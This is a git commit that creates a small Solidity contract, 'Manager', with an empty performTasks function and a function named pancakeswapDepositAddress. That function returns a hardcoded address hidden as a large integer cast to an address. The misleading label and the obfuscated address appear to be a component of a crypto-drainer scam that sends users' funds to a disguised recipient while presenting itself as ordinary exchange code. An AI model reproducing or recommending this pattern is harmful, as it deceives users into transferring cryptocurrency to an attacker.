a9fac713865b8a94e3b28a996d605e7c1cc18f4d
sTEPNN55 <113839524+sTEPNN55@users.noreply.github.com>
2022-09-18 16:33:36 +0300

    Create 6.sol

---
+++ 6.sol
@@ -0,0 +1,9 @@
+contract Manager {
+		 
+		 function performTasks() public {
+		 }
+		 function pancakeswapDepositAddress() public pure returns (address) {
+                    uint160 pindex = 892831424657045743174291980037948166195187165903;
+					return address(pindex);
+					}
+          }
